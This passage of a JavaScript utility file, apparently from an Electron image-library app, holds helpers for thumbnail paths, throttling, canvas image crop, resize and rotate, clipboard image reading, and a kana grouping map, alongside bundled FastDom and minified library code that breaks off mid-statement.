                thumbnailUrl = `${thumbnailUrl}?v=${$bodyScope.modifiedMappings[image.id]}`;
            }
            return thumbnailUrl;
        }
        catch (err) { }
    },
    getRawUrl: function (image) {
        try {
            return URL_MODULE.pathToFileURL(FileUrlHelper.getRawPath(image)).href;
        }
        catch (err) { }
    }
}

function getRawPath(imagesDir, image, force) {
    if (!image || !image.name) return;
    var imageDir = imagesDir + image.id + ".info/";
    var rawPath = "";
    var encodeName = encodeURIComponent(image.name);

    if (image.ext === 'svg') {
        rawPath = imageDir + encodeName + ".svg";
    } else {
        rawPath = imageDir + encodeName + "." + image.ext;
    }

    return rawPath.replace(/#/g, '%23');
}

function getThumbnailPath(imagesDir, image) {
    if (!image || !image.name) return;
    if (image.noThumbnail) {
        return getRawPath(imagesDir, image);
    }
    else {

        var imageDir = imagesDir + image.id + ".info/";
        var thumbnailPath = "";
        var encodeName = encodeURIComponent(image.name);

        if (image.ext === 'svg') {
            if (image.forceThumbnail) {
                thumbnailPath = `${imageDir}${encodeName}_thumbnail.png`;
            }
            else {
                thumbnailPath = `${imageDir}${encodeName}.svg`;
            }
        }
        else {
            thumbnailPath = `${imageDir}${encodeName}_thumbnail.png`;
            // thumbnailPath = "http://localhost:41592/?filePath=" + imageDir + encodeName + "_thumbnail.png";
        }

        return thumbnailPath.replace(/#/g, '%23');
    }
}

/**
 * 產生不重複的 ID
 *
 * @return     {<type>}  { 不重複 ID }
 */
function guid() {
    return (Date.now().toString(36) + Math.random().toString(36).substr(2, 5)).toUpperCase();
}

var throttle = function (fn, delay, immediate, debounce) {
    var curr = +new Date(), //µ±Ç°ÊÂ¼þ
        last_call = 0,
        last_exec = 0,
        timer = null,
        diff, //Ê±¼ä²î
        context, //ÉÏÏÂÎÄ
        args,
        exec = function () {
            last_exec = curr;
            fn.apply(context, args);
        };
    return function () {
        curr = +new Date();
        context = this,
            args = arguments,
            diff = curr - (debounce ? last_call : last_exec) - delay;
        clearTimeout(timer);
        if (debounce) {
            if (immediate) {
                timer = setTimeout(exec, delay);
            } else if (diff >= 0) {
                exec();
            }
        } else {
            if (diff >= 0) {
                exec();
            } else if (immediate) {
                timer = setTimeout(exec, -diff);
            }
        }
        last_call = curr;
    }
};

// Returns a function, that, as long as it continues to be invoked, will not
// be triggered. The function will be called after it stops being called for
// N milliseconds. If `immediate` is passed, trigger the function on the
// leading edge, instead of the trailing.
function debounce(func, wait, immediate) {
    var timeout;
    return function () {
        var context = this,
            args = arguments;
        var later = function () {
            timeout = null;
            if (!immediate) func.apply(context, args);
        };
        var callNow = immediate && !timeout;
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
        if (callNow) func.apply(context, args);
    };
};

/**
 * 判斷元件是否出現在畫面上
 *
 * @param      {<type>}   el      { 欲判斷的元件 }
 * @param      {number}   位移植，預先判斷進入畫面
 * @return     {boolean}  True if element in viewport, False otherwise.
 */
function isElementInViewport(el, offset) {
    if (!el) return false;
    var offset = offset || 0;
    //special bonus for those using jQuery
    if (typeof jQuery === "function" && el instanceof jQuery) {
        el = el[0];
    }
    if (!el) {
        return false;
    }
    var rect = el.getBoundingClientRect();
    return (
        rect.top + offset + rect.height >= 0 &&
        rect.left >= 0 &&
        rect.bottom - offset - rect.height <= (window.innerHeight || document.documentElement.clientHeight) && /*or $(window).height() */
        rect.right <= (window.innerWidth || document.documentElement.clientWidth) /*or $(window).width() */
    );
}

function isElementVisible(el) {
    var rect = el.getBoundingClientRect(),
        vWidth = window.innerWidth || doc.documentElement.clientWidth,
        vHeight = window.innerHeight || doc.documentElement.clientHeight,
        efp = function (x, y) { return document.elementFromPoint(x, y) };

    // Return false if it's not in the viewport
    if (rect.right < 0 || rect.bottom < 0
        || rect.left > vWidth || rect.top > vHeight)
        return false;

    // Return true if any of its four corners are visible
    return (
        el.contains(efp(rect.left, rect.top))
        || el.contains(efp(rect.right, rect.top))
        || el.contains(efp(rect.right, rect.bottom))
        || el.contains(efp(rect.left, rect.bottom))
    );
}

function isElementInContainer($container, $ele) {
    if (!$ele || !$ele[0]) return false;
    const { bottom, height, top } = $ele[0].getBoundingClientRect();
    const containerRect = $container[0].getBoundingClientRect();

    return top <= containerRect.top ? containerRect.top - top <= height : bottom - containerRect.bottom <= height;
}

/**
 * 模糊搜尋
 *
 * @param      {string}             text    欲過濾的文字
 * @param      {string}             search  搜尋關鍵字
 * @return     {(string|string[])}  { 包含<b>的字串陣列 }
 */
function fuzzy_match(text, search) {

    var search = search.replace(/\ /g, '').toLowerCase();
    var tokens = [];
    var search_position = 0;

    for (var n = 0; n < text.length; n++) {
        var text_char = text[n];
        if (search_position < search.length &&
            text_char.toLowerCase() == search[search_position]) {
            text_char = '<b>' + text_char + '</b>';
            search_position += 1;
        }
        tokens.push(text_char);
    }

    if (search_position != search.length) {
        return '';
    }
    return tokens.join('');
}

function fileSize(bytes, precision) {
    var units = [
        'bytes',
        'KB',
        'MB',
        'GB',
        'TB',
        'PB'
    ];

    if (isNaN(parseFloat(bytes)) || !isFinite(bytes)) {
        return '?';
    }

    var unit = 0;
    var k = 1024;
    if (process.platform === 'darwin') k = 1000;

    while (bytes >= k) {
        bytes /= k;
        unit++;
    }

    return bytes.toFixed(+precision) + ' ' + units[unit];
};

function getZIndex(e) {
    if (e == document) return 0;
    var z = document.defaultView.getComputedStyle(e).getPropertyValue('z-index');
    if (isNaN(z)) return getZIndex(e.parentNode);
    else return z;
};

CanvasRenderingContext2D.prototype.roundRect = function (x, y, width, height, radius) {
    if (width < 2 * radius) radius = width / 2;
    if (height < 2 * radius) radius = height / 2;
    this.beginPath();
    this.moveTo(x + radius, y);
    this.arcTo(x + width, y, x + width, y + height, radius);
    this.arcTo(x + width, y + height, x, y + height, radius);
    this.arcTo(x, y + height, x, y, radius);
    this.arcTo(x, y, x + width, y, radius);
    this.closePath();
    return this;
}

Array.prototype.shuffle = function () {
    var tmp, current, top = this.length;

    if (top) while (--top) {
        current = Math.floor(Math.random() * (top + 1));
        tmp = this[current];
        this[current] = this[top];
        this[top] = tmp;
    }

    return this;
}

Array.prototype.unique =
    (() => function () { return [...new Set(this)] })()

Array.prototype.move = function (old_index, new_index) {
    if (new_index >= this.length) {
        var k = new_index - this.length;
        while ((k--) + 1) {
            this.push(undefined);
        }
    }
    this.splice(new_index, 0, this.splice(old_index, 1)[0]);
    return this; // for testing purposes
};

String.prototype.score = function (word, fuzziness) {
    'use strict';

    // If the string is equal to the word, perfect match.
    if (this === word) { return 1; }

    //if it's not a perfect match and is empty return 0
    if (word === "") { return 0; }

    var runningScore = 0,
        charScore,
        finalScore,
        string = this,
        lString = string.toLowerCase(),
        strLength = string.length,
        lWord = word.toLowerCase(),
        wordLength = word.length,
        idxOf,
        startAt = 0,
        fuzzies = 1,
        fuzzyFactor,
        i;

    // Cache fuzzyFactor for speed increase
    if (fuzziness) { fuzzyFactor = 1 - fuzziness; }

    // Walk through word and add up scores.
    // Code duplication occurs to prevent checking fuzziness inside for loop
    if (fuzziness) {
        for (i = 0; i < wordLength; i += 1) {

            // Find next first case-insensitive match of a character.
            idxOf = lString.indexOf(lWord[i], startAt);

            if (idxOf === -1) {
                fuzzies += fuzzyFactor;
            } else {
                if (startAt === idxOf) {
                    // Consecutive letter & start-of-string Bonus
                    charScore = 0.7;
                } else {
                    charScore = 0.1;

                    // Acronym Bonus
                    // Weighing Logic: Typing the first character of an acronym is as if you
                    // preceded it with two perfect character matches.
                    if (string[idxOf - 1] === ' ') { charScore += 0.8; }
                }

                // Same case bonus.
                if (string[idxOf] === word[i]) { charScore += 0.1; }

                // Update scores and startAt position for next round of indexOf
                runningScore += charScore;
                startAt = idxOf + 1;
            }
        }
    } else {
        for (i = 0; i < wordLength; i += 1) {
            idxOf = lString.indexOf(lWord[i], startAt);
            if (-1 === idxOf) { return 0; }

            if (startAt === idxOf) {
                charScore = 0.7;
            } else {
                charScore = 0.1;
                if (string[idxOf - 1] === ' ') { charScore += 0.8; }
            }
            if (string[idxOf] === word[i]) { charScore += 0.1; }
            runningScore += charScore;
            startAt = idxOf + 1;
        }
    }

    // Reduce penalty for longer strings.
    finalScore = 0.5 * (runningScore / strLength + runningScore / wordLength) / fuzzies;

    if ((lWord[0] === lString[0]) && (finalScore < 0.85)) {
        finalScore += 0.15;
    }

    return finalScore;
};

String.prototype.capitalize = function () {
    return this.charAt(0).toUpperCase() + this.slice(1);
}

String.prototype.replaceAll = function (search, replacement) {
    var target = this;
    return target.replace(new RegExp(search, 'g'), replacement);
};

String.prototype.localeLength = function () {
    var inputLength = 0;
    //给一个变量来记录长度
    for (var i = 0; i < this.length; i++) {
        var countCode = this.charCodeAt(i);
        //返回指定位置的字符的Unicode编码
        //判断是不是ASCII码,Unicode码前128个字符是ASCII码
        if (countCode >= 0 && countCode <= 128) {
            inputLength++;
        } else {
            inputLength += 2;
            //如果是扩展码，则一次+2
        }
    }
    return inputLength;
}

jQuery.fn.reverse = [].reverse;

var videoHelper = {
    // 这是个很白痴的设定，浏览器默认会使用 throttle 功能，如果短时间疯狂修改 currentTime 画面不会立即更新，以列方式是加大更新 currentTime 的时间差，骗过浏览器的节流功能
    setCurrentTime: throttle(function setCurrentTime(v, currentTime) {
        v.currentTime = currentTime;
    }, 33),
    setVideosCurrentTime: throttle(function setCurrentTime(vs, currentTime) {
        vs.forEach(v => {
            v.currentTime = currentTime;
        });
    }, 33)
}

var canvasHelper = {
    _getImageType: function _getImageType(str) {
        var mimeType = 'image/jpeg';
        var outputType = str.match(/(image\/[\w]+)\.*/)[0];
        if (typeof outputType !== 'undefined') {
            mimeType = outputType;
        }
        return mimeType;
    },
    compress: function compress(src, quality, callback) {
        var reader = new FileReader();
        var self = this;
        reader.onload = function (event) {
            var image = new Image();
            image.src = event.target.result;
            image.onload = function () {
                var mimeType = self._getImageType(src.type);
                var cvs = self._getCanvas(image.naturalWidth, image.naturalHeight);
                var ctx = cvs.getContext("2d").drawImage(image, 0, 0);
                var newImageData = cvs.toDataURL(mimeType, quality / 100);
                callback(newImageData);
            };
        };
        reader.readAsDataURL(src);
    },

    /**
    * crop image via canvas and generate data
    **/
    crop: function crop(image, options, callback) {
        var checkNumber = function checkNumber(num) {
            return typeof num === 'number';
        };
        // check crop options
        if (checkNumber(options.toCropImgX) && checkNumber(options.toCropImgY) && options.toCropImgW > 0 && options.toCropImgH > 0) {
            var w = options.toCropImgW;
            var h = options.toCropImgH;
            if (options.maxWidth && options.maxWidth < w) {
                w = options.maxWidth;
                h = options.toCropImgH * w / options.toCropImgW;
            }
            if (options.maxHeight && options.maxHeight < h) {
                h = options.maxHeight;
            }
            var cvs = this._getCanvas(w, h);
            var ctx = cvs.getContext('2d').drawImage(image, options.toCropImgX, options.toCropImgY, options.toCropImgW, options.toCropImgH, 0, 0, w, h);
            var mimeType = options.mimeType;
            var data = cvs.toDataURL(mimeType, options.compress / 100);
            callback(data);
        }
    },
    resize: async function resize(image, options, callback) {
        var checkNumber = function checkNumber(num) {
            return typeof num === 'number';
        };
        if (checkNumber(options.toCropImgX) && checkNumber(options.toCropImgY) && options.toCropImgW > 0 && options.toCropImgH > 0) {
            const w = Math.ceil(options.toCropImgW * options.imgChangeRatio);
            const h = Math.ceil(options.toCropImgH * options.imgChangeRatio);
            const cvs = this._getCanvas(w, h);
            const ctx = cvs.getContext('2d');

            if (options.mimeType !== 'image/png' && options.mimeType !== 'image/webp') {
                ctx.fillStyle = '#fff';
                ctx.fillRect(0, 0, w, h);
            }

            // if image.src contains .svg, drawImage directly
            if (image.src && image.src.indexOf('.svg') > -1) {
                ctx.drawImage(image, 0, 0, w, h);
            }
            else {
                // NOTE: 之所以要這樣寫是因為超長圖片 canvas drawImage 有問題，畫到 3 萬多就不會畫了
                const blob = await fetch(image.src).then(r => r.blob());
                const bitmap = await createImageBitmap(blob, {
                    resizeWidth: w,
                    resizeHeight: h,
                    resizeQuality: 'high'
                });

                ctx.drawImage(bitmap, 0, 0);
            }
            
            if (options.mimeType === "image/bmp") {
                CanvasToBMP.toDataURL(cvs, function (bmpDataUri) {
                    if (bmpDataUri.length < 10) {
                        callback(undefined);
                    }
                    else {
                        callback(bmpDataUri);
                    }
                });
            }
            else {
                var data = cvs.toDataURL(options.mimeType, options.quality);
                callback(data);
            }
        }
    },
    rotate: function rotate(src, degrees, ext, callback) {
        var _this = this;
        this._loadImage(src, function (image) {
            var w = image.naturalWidth;
            var h = image.naturalHeight;
            var canvasWidth = Math.max(w, h);
            var cvs = _this._getCanvas(canvasWidth, canvasWidth);
            var ctx = cvs.getContext('2d');
            ctx.translate(canvasWidth / 2, canvasWidth / 2);
            ctx.rotate(degrees * (Math.PI / 180));
            var x = -canvasWidth / 2;
            var y = -canvasWidth / 2;
            degrees = degrees % 360;
            if (degrees === 0) {
                return callback(src, w, h);
            }
            var sx = 0;
            var sy = 0;
            if ((degrees % 180) !== 0) {
                if (degrees === -90 || degrees === 270) {
                    x = -w + canvasWidth / 2;
                } else {
                    y = canvasWidth / 2 - h;
                }
                const c = w;
                w = h;
                h = c;
            } else {
                x = canvasWidth / 2 - w;
                y = canvasWidth / 2 - h;
            }
            ctx.drawImage(image, x, y);
            var cvs2 = _this._getCanvas(w, h);
            var ctx2 = cvs2.getContext('2d');
            ctx2.drawImage(cvs, 0, 0, w, h, 0, 0, w, h);
            var mimeType;
            switch (ext) {
                case "webp":
                    mimeType = 'image/webp';
                    break;
                case "png":
                    mimeType = 'image/png';
                    break;
                case "bmp":
                    CanvasToBMP.toDataURL(cvs2, function (bmpDataUri) {
                        if (bmpDataUri.length < 10) {
                            callback(undefined, w, h);
                        }
                        else {
                            callback(bmpDataUri, w, h);
                        }
                    });
                    return;
                    break;
                case "jpg":
                case "jpeg":
                default:
                    mimeType = 'image/jpeg';
                    break;
            }
            if (cvs.toDataURL('image/jpeg').length < 10) {
                callback(undefined, w, h);
            }
            else {
                var data = cvs2.toDataURL(mimeType, 1);
                callback(data, w, h);
            }
        });
    },
    _loadImage: function _loadImage(data, callback) {
        var image = new Image();
        image.src = data;
        image.onload = function () {
            callback(image);
        };
        image.onerror = function () {
            console.log('Error: image error!');
        };
    },
    _getCanvas: function _getCanvas(width, height) {
        var canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        return canvas;
    }
};

function getDurationString(number, total) {
    if (number) {
        var date = new Date(null);
        var seconds = Math.max(1, parseInt(number));
        date.setSeconds(seconds);
        if (total && total <= 60 && seconds < 3600) {
            let fract = number - Math.trunc(number);
            return date.toISOString().substr(15, 4) + "" + fract.toFixed(2).substr(1);
        }
        else if (seconds < 3600) {
            return date.toISOString().substr(14, 5);
        }
        else {
            return date.toISOString().substr(11, 8);
        }
    }
    return "";
}

function decodeBase64Image(dataString) {
    let response = {};
    if (dataString.indexOf(`data:image/svg+xml;utf8,`) > -1) {
        let svgStr = dataString.split(`data:image/svg+xml;utf8,`)[1];
        response.data = new Buffer(decodeURIComponent(svgStr), 'utf-8');
    }
    else {
        let base64 = dataString.split(";base64,")?.[1];
        let type = dataString.match(/^data:(.+?);/)?.[1];
        if (!base64 || !type) return;
        response.type = type;
        response.data = new Buffer(base64, 'base64');
    }
    return response;
}

async function getClipboardImage() {
    return new Promise((resolve, reject) => {

        try {
            let image;
            let files = [];
            let url;
            let fileurl;

            let nativeImg = clipboard.readImage();
            if (!nativeImg.isEmpty()) {
                image = nativeImg;
            }

            if (process.platform == 'darwin') {

                let PASTEBOARD_FILE_URL = 'NSFilenamesPboardType';
                let PASTEBOARD_URL_NAME = 'public.url-name';
                let PASTEBOARD_URL = 'public.file-url';

                let fileurlBuf = clipboard.readBuffer(PASTEBOARD_FILE_URL);
                let nameBuf = clipboard.readBuffer(PASTEBOARD_URL_NAME);
                let urlBuf = clipboard.readBuffer(PASTEBOARD_URL);

                try {
                    fileurl = fileurlBuf.toString();
                    name = nameBuf.toString();
                    url = urlBuf.toString();
                } catch (err) { }
            }
            
            if (fileurl) {
                $(`<div>${fileurl}</div>`).find("plist").find("string").each(function () {
                    files.push($(this).text());
                })
            }

            let text = clipboard.readText();

            if (is.url(text)) {
                $.ajax({
                    type: "HEAD",
                    url: text,
                    timeout: 10000,
                    complete: function (xhr, textStatus) {
                        let contentType = xhr.getResponseHeader('Content-Type') || "";
                        if (contentType.indexOf("image") > -1) {
                            url = text;
                        }
                        return resolve({
                            image: image,
                            url: url,
                            files: files
                        });
                    }
                });
            }
            else {
                if (process.platform == 'darwin') {
                    return resolve({
                        image: image,
                        url: url,
                        files: files
                    });
                }
                else {
                    const filePath = clipboard.readBuffer('FileNameW').toString('ucs2').replace(RegExp(String.fromCharCode(0), 'g'), '');
                    if (filePath) {
                        files.push(path.normalize(filePath));
                    }
                    return resolve({
                        image: image,
                        url: url,
                        files: files
                    });
                }
            }
        } catch (err) {
            return reject(err);
        }

    });
}

function yyyydd(dateTime) {
    var date = new Date(dateTime);
    var yyyy = date.getFullYear();
    var mm = date.getMonth() + 1;
    var dd = date.getDate();
    return `${yyyy}/${(mm > 9 ? '' : '0')}${mm}`;
};

function paddingNumber(num, length) {
    return (Array(length).join("0") + num).slice(-length);
}

function canvasResizeTo(canvas, pct) {

    var cw = canvas.width;
    var ch = canvas.height;
    var tempCanvas = document.createElement('canvas');
    var tctx = tempCanvas.getContext("2d");

    tempCanvas.width = cw;
    tempCanvas.height = ch;
    tctx.drawImage(canvas, 0, 0);
    canvas.width *= pct;
    canvas.height *= pct;

    var ctx = canvas.getContext('2d');
    ctx.drawImage(tempCanvas, 0, 0, cw, ch, 0, 0, cw * pct, ch * pct);
}

var CanvasToBMP = { toArrayBuffer: function (f, e) { var D = f.width, l = f.height, E = D << 2, m = f.getContext("2d").getImageData(0, 0, D, l), i = new Uint32Array(m.data.buffer), A = ((32 * D + 31) / 32) << 2, o = A * l, k = 122 + o, j = new ArrayBuffer(k), C = new DataView(j), d = 1 << 20, c = d, G = 0, F, B, b, q = 0, n, r = 0; u(19778); z(k); t(4); z(122); z(108); z(D); z(-l >>> 0); u(1); u(32); z(3); z(o); z(2835); z(2835); t(8); z(16711680); z(65280); z(255); z(4278190080); z(1466527264); (function g() { while (G < l && c > 0) { n = 122 + G * A; F = 0; while (F < E) { c--; B = i[r++]; b = B >>> 24; C.setUint32(n + F, (B << 8) | b); F += 4 } G++ } if (r < i.length) { c = d; setTimeout(g, CanvasToBMP._dly) } else { e(j) } })(); function u(a) { C.setUint16(q, a, !0); q += 2 } function z(a) { C.setUint32(q, a, !0); q += 4 } function t(a) { q += a } }, toBlob: function (b, a) { this.toArrayBuffer(b, function (c) { a(new Blob([c], { type: "image/bmp" })) }) }, toObjectURL: function (b, a) { this.toBlob(b, function (c) { var d = self.URL || self.webkitURL || self; a(d.createObjectURL(c)) }) }, toDataURL: function (b, a) { this.toArrayBuffer(b, function (h) { var g = new Uint8Array(h), e = 1 << 20, d = e, f = "", c = "", j = 0, k = g.length; (function m() { while (j < k && d-- > 0) { f += String.fromCharCode(g[j++]) } if (j < k) { d = e; setTimeout(m, CanvasToBMP._dly) } else { j = 0; k = f.length; d = 180000; (function i() { c += btoa(f.substr(j, d)); j += d; (j < k) ? setTimeout(i, CanvasToBMP._dly) : a("data:image/bmp;base64," + c) })() } })() }) } }; CanvasToBMP._dly = 9;





!(function (win) {

    /**
     * FastDom
     *
     * Eliminates layout thrashing
     * by batching DOM read/write
     * interactions.
     *
     * @author Wilson Page <wilsonpage@me.com>
     * @author Kornel Lesinski <kornel.lesinski@ft.com>
     */

    'use strict';

    /**
     * Mini logger
     *
     * @return {Function}
     */
    var debug = 0 ? console.log.bind(console, '[fastdom]') : function () { };

    /**
     * Normalized rAF
     *
     * @type {Function}
     */
    var raf = win.requestAnimationFrame
        || win.webkitRequestAnimationFrame
        || win.mozRequestAnimationFrame
        || win.msRequestAnimationFrame
        || function (cb) { return setTimeout(cb, 16); };

    /**
     * Initialize a `FastDom`.
     *
     * @constructor
     */
    function FastDom() {
        var self = this;
        self.reads = [];
        self.writes = [];
        self.raf = raf.bind(win); // test hook
        debug('initialized', self);
    }

    FastDom.prototype = {
        constructor: FastDom,

        /**
         * We run this inside a try catch
         * so that if any jobs error, we
         * are able to recover and continue
         * to flush the batch until it's empty.
         *
         * @param {Array} tasks
         */
        runTasks: function (tasks) {
            debug('run tasks');
            var task; while (task = tasks.shift()) task();
        },

        /**
         * Adds a job to the read batch and
         * schedules a new frame if need be.
         *
         * @param  {Function} fn
         * @param  {Object} ctx the context to be bound to `fn` (optional).
         * @public
         */
        measure: function (fn, ctx) {
            debug('measure');
            var task = !ctx ? fn : fn.bind(ctx);
            this.reads.push(task);
            scheduleFlush(this);
            return task;
        },

        /**
         * Adds a job to the
         * write batch and schedules
         * a new frame if need be.
         *
         * @param  {Function} fn
         * @param  {Object} ctx the context to be bound to `fn` (optional).
         * @public
         */
        mutate: function (fn, ctx) {
            debug('mutate');
            var task = !ctx ? fn : fn.bind(ctx);
            this.writes.push(task);
            scheduleFlush(this);
            return task;
        },

        /**
         * Clears a scheduled 'read' or 'write' task.
         *
         * @param {Object} task
         * @return {Boolean} success
         * @public
         */
        clear: function (task) {
            debug('clear', task);
            return remove(this.reads, task) || remove(this.writes, task);
        },

        /**
         * Extend this FastDom with some
         * custom functionality.
         *
         * Because fastdom must *always* be a
         * singleton, we're actually extending
         * the fastdom instance. This means tasks
         * scheduled by an extension still enter
         * fastdom's global task queue.
         *
         * The 'super' instance can be accessed
         * from `this.fastdom`.
         *
         * @example
         *
         * var myFastdom = fastdom.extend({
         *   initialize: function() {
         *     // runs on creation
         *   },
         *
         *   // override a method
         *   measure: function(fn) {
         *     // do extra stuff ...
         *
         *     // then call the original
         *     return this.fastdom.measure(fn);
         *   },
         *
         *   ...
         * });
         *
         * @param  {Object} props  properties to mixin
         * @return {FastDom}
         */
        extend: function (props) {
            debug('extend', props);
            if (typeof props != 'object') throw new Error('expected object');

            var child = Object.create(this);
            mixin(child, props);
            child.fastdom = this;

            // run optional creation hook
            if (child.initialize) child.initialize();

            return child;
        },

        // override this with a function
        // to prevent Errors in console
        // when tasks throw
        catch: null
    };

    /**
     * Schedules a new read/write
     * batch if one isn't pending.
     *
     * @private
     */
    function scheduleFlush(fastdom) {
        if (!fastdom.scheduled) {
            fastdom.scheduled = true;
            fastdom.raf(flush.bind(null, fastdom));
            debug('flush scheduled');
        }
    }

    /**
     * Runs queued `read` and `write` tasks.
     *
     * Errors are caught and thrown by default.
     * If a `.catch` function has been defined
     * it is called instead.
     *
     * @private
     */
    function flush(fastdom) {
        debug('flush');

        var writes = fastdom.writes;
        var reads = fastdom.reads;
        var error;

        try {
            debug('flushing reads', reads.length);
            fastdom.runTasks(reads);
            debug('flushing writes', writes.length);
            fastdom.runTasks(writes);
        } catch (e) { error = e; }

        fastdom.scheduled = false;

        // If the batch errored we may still have tasks queued
        if (reads.length || writes.length) scheduleFlush(fastdom);

        if (error) {
            debug('task errored', error.message);
            if (fastdom.catch) fastdom.catch(error);
            else throw error;
        }
    }

    /**
     * Remove an item from an Array.
     *
     * @param  {Array} array
     * @param  {*} item
     * @return {Boolean}
     */
    function remove(array, item) {
        var index = array.indexOf(item);
        return !!~index && !!array.splice(index, 1);
    }

    /**
     * Mixin own properties of source
     * object into the target.
     *
     * @param  {Object} target
     * @param  {Object} source
     */
    function mixin(target, source) {
        for (var key in source) {
            if (source.hasOwnProperty(key)) target[key] = source[key];
        }
    }

    // There should never be more than
    // one instance of `FastDom` in an app
    var exports = win.fastdom = (win.fastdom || new FastDom()); // jshint ignore:line

    // Expose to CJS & AMD
    if ((typeof define) == 'function') define(function () { return exports; });
    else if ((typeof module) == 'object') module.exports = exports;

})(typeof window !== 'undefined' ? window : this);
const JAPANESE_CHAR_MAP = {
    "あ": "あ",
    "ア": "あ",
    "い": "あ",
    "イ": "あ",
    "う": "あ",
    "ウ": "あ",
    "え": "あ",
    "エ": "あ",
    "お": "あ",
    "オ": "あ",
    "か": "か",
    "が": "か",
    "カ": "か",
    "ガ": "か",
    "き": "か",
    "ぎ": "か",
    "キ": "か",
    "ギ": "か",
    "く": "か",
    "ぐ": "か",
    "ク": "か",
    "グ": "か",
    "け": "か",
    "げ": "か",
    "ケ": "か",
    "ゲ": "か",
    "こ": "か",
    "ご": "か",
    "コ": "か",
    "ゴ": "か",
    "さ": "さ",
    "ざ": "さ",
    "サ": "さ",
    "ザ": "さ",
    "し": "さ",
    "じ": "さ",
    "シ": "さ",
    "ジ": "さ",
    "す": "さ",
    "ず": "さ",
    "ス": "さ",
    "ズ": "さ",
    "せ": "さ",
    "ぜ": "さ",
    "セ": "さ",
    "ゼ": "さ",
    "そ": "さ",
    "ぞ": "さ",
    "ソ": "さ",
    "ゾ": "さ",
    "た": "た",
    "だ": "た",
    "タ": "た",
    "ダ": "た",
    "ち": "た",
    "ぢ": "た",
    "チ": "た",
    "ヂ": "た",
    "つ": "た",
    "づ": "た",
    "ツ": "た",
    "ヅ": "た",
    "て": "た",
    "で": "た",
    "テ": "た",
    "デ": "た",
    "と": "た",
    "ど": "た",
    "ト": "た",
    "ド": "た",
    "な": "な",
    "ば": "な",
    "ナ": "な",
    "ナ": "な",
    "に": "な",
    "ニ": "な",
    "ぬ": "な",
    "ヌ": "な",
    "ね": "な",
    "ネ": "な",
    "の": "な",
    "ノ": "な",
    "は": "は",
    "ぱ": "は",
    "ハ": "は",
    "バ": "は",
    "パ": "は",
    "ひ": "は",
    "び": "は",
    "ぴ": "は",
    "ヒ": "は",
    "ビ": "は",
    "ピ": "は",
    "ふ": "は",
    "ぶ": "は",
    "ぷ": "は",
    "フ": "は",
    "ブ": "は",
    "プ": "は",
    "へ": "は",
    "べ": "は",
    "ぺ": "は",
    "ヘ": "は",
    "ベ": "は",
    "ペ": "は",
    "ほ": "は",
    "ぼ": "は",
    "ぽ": "は",
    "ホ": "は",
    "ボ": "は",
    "ポ": "は",
    "ま": "ま",
    "マ": "ま",
    "み": "ま",
    "ミ": "ま",
    "む": "ま",
    "ム": "ま",
    "め": "ま",
    "メ": "ま",
    "も": "ま",
    "モ": "ま",
    "や": "や",
    "ヤ": "や",
    "ゆ": "や",
    "ユ": "や",
    "よ": "や",
    "ヨ": "や",
    "ら": "ら",
    "ラ": "ら",
    "り": "ら",
    "リ": "ら",
    "る": "ら",
    "ル": "ら",
    "れ": "ら",
    "レ": "ら",
    "ろ": "ら",
    "ロ": "ら",
    "わ": "わ",
    "ワ": "わ",
    "を": "わ",
    "ヲ": "わ",
}
const IPCHelper = {
	send: function (channel, params, ignoreLogging) {
		try {
			ipcRenderer.send(channel, params);
			if (!ignoreLogging) {
				electronLog && electronLog.info(`[ipc] ${channel}`);
			}
		}
		catch (err) {

		}
	},
	sendTo: function (id, channel, params, ignoreLogging) {
		try {
			ipcRenderer.sendTo(id, channel, params);
			if (!ignoreLogging) {
				electronLog && electronLog.info(`[ipc] ${channel}`);
			}
		}
		catch (err) {

		}
	}
};
!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.Component=t():(e.eg=e.eg||{},e.eg.Component=t())}(this,function(){return function(e){function __webpack_require__(n){if(t[n])return t[n].exports;var r=t[n]={i:n,l:!1,exports:{}};return e[n].call(r.exports,r,r.exports,__webpack_require__),r.l=!0,r.exports}var t={};return __webpack_require__.m=e,__webpack_require__.c=t,__webpack_require__.d=function(e,t,n){__webpack_require__.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:n})},__webpack_require__.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return __webpack_require__.d(t,"a",t),t},__webpack_require__.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},__webpack_require__.p="",__webpack_require__(__webpack_require__.s=0)}([function(e,t,n){"use strict";var r=n(1),o=function(e){return e&&e.__esModule?e:{"default":e}}(r);o["default"].VERSION="2.1.0",e.exports=o["default"]},function(e,t,n){"use strict";function _classCallCheck(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}t.__esModule=!0;var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},o=function(){function Component(){_classCallCheck(this,Component),this._eventHandler={},this.options={}}return Component.prototype.trigger=function(e){var t=arguments.length>1&&arguments[1]!==undefined?arguments[1]:{},n=this._eventHandler[e]||[];if(!(n.length>0))return!0;n=n.concat(),t.eventType=e;var r=!1,o=[t],i=0;t.stop=function(){r=!0},t.currentTarget=this;for(var u=arguments.length,f=Array(u>2?u-2:0),_=2;_<u;_++)f[_-2]=arguments[_];for(f.length>=1&&(o=o.concat(f)),i=0;n[i];i++)n[i].apply(this,o);return!r},Component.prototype.once=function(e,t){if("object"===(void 0===e?"undefined":r(e))&&void 0===t){var n=e,o=void 0;for(o in n)this.once(o,n[o]);return this}if("string"==typeof e&&"function"==typeof t){var i=this;this.on(e,function listener(){for(var n=arguments.length,r=Array(n),o=0;o<n;o++)r[o]=arguments[o];t.apply(i,r),i.off(e,listener)})}return this},Component.prototype.hasOn=function(e){return!!this._eventHandler[e]},Component.prototype.on=function(e,t){if("object"===(void 0===e?"undefined":r(e))&&void 0===t){var n=e,o=void 0;for(o in n)this.on(o,n[o]);return this}if("string"==typeof e&&"function"==typeof t){var i=this._eventHandler[e];void 0===i&&(this._eventHandler[e]=[],i=this._eventHandler[e]),i.push(t)}return this},Component.prototype.off=function(e,t){if(void 0===e)return this._eventHandler={},this;if(void 0===t){if("string"==typeof e)return this._eventHandler[e]=undefined,this;var n=e,r=void 0;for(r in n)this.off(r,n[r]);return this}var o=this._eventHandler[e];if(o){var i=void 0,u=void 